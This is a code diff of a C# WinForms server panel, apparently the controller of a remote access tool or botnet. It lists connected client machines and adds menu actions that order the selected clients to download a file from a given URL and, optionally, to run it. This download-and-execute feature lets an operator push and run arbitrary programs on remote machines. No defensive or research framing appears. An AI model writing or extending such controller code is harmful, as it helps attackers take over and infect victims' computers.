@@ -1,14 +1,17 @@
-﻿using Share;
+﻿using Server.Networking;
+using Share;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Net.Sockets;
+using System.Security.Policy;
 using System.Windows.Forms;
 
 namespace Server
 {
     public partial class Form1 : Form
     {
-        public static Networking.Server serverSocket = new Networking.Server();
+        public static Networking.Server SERVER = new Networking.Server();
 
         public Form1()
         {
@@ -18,23 +21,26 @@ namespace Server
             timer.Tick += new EventHandler(ListClients);
             timer.Interval = 10000;
             timer.Start();
-            //System.Threading.Timer timer = new System.Threading.Timer((TimerCallback)ListClients, null, 10000, 10000);
         }
 
         private void ListClients(object sender, EventArgs e)
         {
             
             listView1.Items.Clear();
-            serverSocket.SendRequest(PacketType.ListClient, serverSocket._clientSockets.ToArray());
 
-            foreach (KeyValuePair<Socket,string[]> client in serverSocket._clientInfo) {
-                string ping = serverSocket.PingClient(client.Key).ToString();
+            ClientInteraction.ListClients(SERVER);
+            System.Threading.Thread.Sleep(1000);
+            foreach (KeyValuePair<Socket,string[]> client in SERVER._clientInfo) {
+                string ping = ClientInteraction.PingClient(client.Key).ToString();
+
+                // Add all information about client to the list view
                 ListViewItem lvi = new ListViewItem { Text = client.Value[client.Value.Length - 1] };
 
                 for (int i = 0; i < client.Value.Length - 1; i++) {
                     lvi.SubItems.Add(client.Value[i]);
                 }
                 lvi.SubItems.Add(ping);
+                lvi.Tag = client.Key;
                 listView1.Items.Add(lvi);
 
             }
@@ -68,6 +74,50 @@ namespace Server
                 MessageBox.Show(ex.Message, "Error When Building", MessageBoxButtons.OK);
             }
             */
+        }
+
+        private void DownloadFileToolStripMenuItem_Click(object sender, EventArgs e) {
+            int nClients = listView1.SelectedItems.Count;
+            if (nClients < 1) return;
+
+            DownloadFileForm dForm = new DownloadFileForm();
+
+            DialogResult result = dForm.ShowDialog();
+
+            string url = dForm.Controls["textBox1"].Text;
+            string filename = dForm.Controls["textBox2"].Text;
+
+            if (url == string.Empty || filename == string.Empty) return;
+
+            Socket[] sockets = new Socket[nClients];
+            foreach(ListViewItem curSocket in listView1.SelectedItems) {
+                sockets[nClients-1] = curSocket.Tag as Socket;
+                nClients--;
+            }
+            
+            ClientInteraction.DownloadFile(SERVER, url, filename, false, sockets);
+        }
+
+        private void downloadAndExecuteFileToolStripMenuItem_Click(object sender, EventArgs e) {
+            int nClients = listView1.SelectedItems.Count;
+            if (nClients < 1) return;
+            Socket[] sockets = new Socket[nClients];
+            foreach (ListViewItem curSocket in listView1.SelectedItems) {
+                sockets[nClients - 1] = curSocket.Tag as Socket;
+                nClients--;
+            }
+
+            DownloadFileForm dForm = new DownloadFileForm();
+
+            DialogResult result = dForm.ShowDialog();
+
+            string url = dForm.Controls["textBox1"].Text;
+            string filename = dForm.Controls["textBox2"].Text;
+
+            if (url == string.Empty || filename == string.Empty) return;
+
+
+            ClientInteraction.DownloadFile(SERVER, url, filename, true, sockets);
         }
     }
 }
